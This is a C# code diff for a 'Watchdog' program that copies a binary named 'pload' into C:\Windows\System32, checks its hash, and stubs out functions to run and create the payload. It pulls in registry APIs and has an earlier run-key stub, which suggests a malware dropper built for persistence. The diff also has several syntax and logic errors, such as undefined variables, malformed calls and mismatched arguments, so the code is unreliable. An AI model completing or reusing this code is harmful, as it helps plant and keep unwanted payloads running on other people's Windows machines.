@@ -2,13 +2,16 @@ using System;
 using System.Diagnostics;
 using System.Linq;
 using System.Threading;
+using Microsoft.Win32;
+
 
 class Watchdog : IWatchdog
 {
 
 
-    static string binaryPath = @"C:\\example";
-    static string binaryName = @"example";
+    static string binaryPath = @"C:\\Windows\System32";
+    static string binaryName = @"pload";
+
 
 
     static void Main(string[] args)
@@ -43,8 +46,7 @@ class Watchdog : IWatchdog
 
     }
 
-    // Function to check if a specific process is running
-    static bool IsProcessRunning(string processName)
+    static bool IWatchdog.IsProcessRunning(string processName)
     {
         // Get a list of processes by name
         Process[] processes = Process.GetProcessesByName(processName);
@@ -55,25 +57,86 @@ class Watchdog : IWatchdog
         // Example loop to simulate frequent checks
         while (true)
         {
-            // Perform any frequent checks or operations here
+            
+
+
+
+
+
+
             Console.WriteLine("Watchdog is monitoring...");
             Thread.Sleep(10000);  // Sleep for 1 second
         }
     }
 
-    static void IWatchdog.setRunKey()
+    public static void CheckPayload(string destinationPath)
     {
-        throw new NotImplementedException();
+        string currentDirectory = Directory.GetCurrentDirectory();
+        string sourcePath = Path.Combine(currentDirectory, binaryName);
+        string destPathBinary = binaryPath.Combine(destinationPath,binaryName)
+
+
+        if(File.Exists(destPathBinary) && File.Exists(sourcePath) && CompareFileHashes(destinationPath)){
+            return;
+        } 
+        else if(File.Exists(sourcePath)){
+            CopyPayload(string destPathBinary, string sourcePath);
+        }
+        else{
+
+        }
     }
 
-    static bool IWatchdog.IsProcessRunning(string processName)
-    {
-        throw new NotImplementedException();
+    public static void CopyPayload(string destPathBinary, string sourcePath){
+        // Check if the .exe exists in the current directory
+        if (File.Exists(sourcePath))
+        {
+            // Copy the .exe to the destination
+            try
+            {
+                File.Copy(sourcePath, destinationPath, overwrite: true);
+                Console.WriteLine($"'{binaryName}' found and copied to {destinationPath}");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error copying file: {ex.Message}");
+            }
+        }
+        else
+        {
+            Console.WriteLine($"'{binaryName}' not found in the current directory.");
+        }
     }
 
-    static void IWatchdog.WatchdogLogic()
+    public static bool CompareFileHashes(string filePath1, string filePath2)
     {
-        throw new NotImplementedException();
+        try
+        {
+            // Calculate the hash of each file
+            byte[] hash1 = ComputeFileHash(filePath1);
+            byte[] hash2 = ComputeFileHash(filePath2);
+
+            // Compare the two hashes
+            return StructuralComparisons.StructuralEqualityComparer.Equals(hash1, hash2);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Error comparing files: {ex.Message}");
+            return false;
+        }
+    }
+
+    private static byte[] ComputeFileHash(string filePath)
+    {
+        using (FileStream stream = File.OpenRead(filePath))
+        using (SHA256 sha256 = SHA256.Create())
+        {
+            return sha256.ComputeHash(stream);
+        }
+    }
+
+    public static void runPayload(){
+
     }
 
     public void createPayloadBinary()
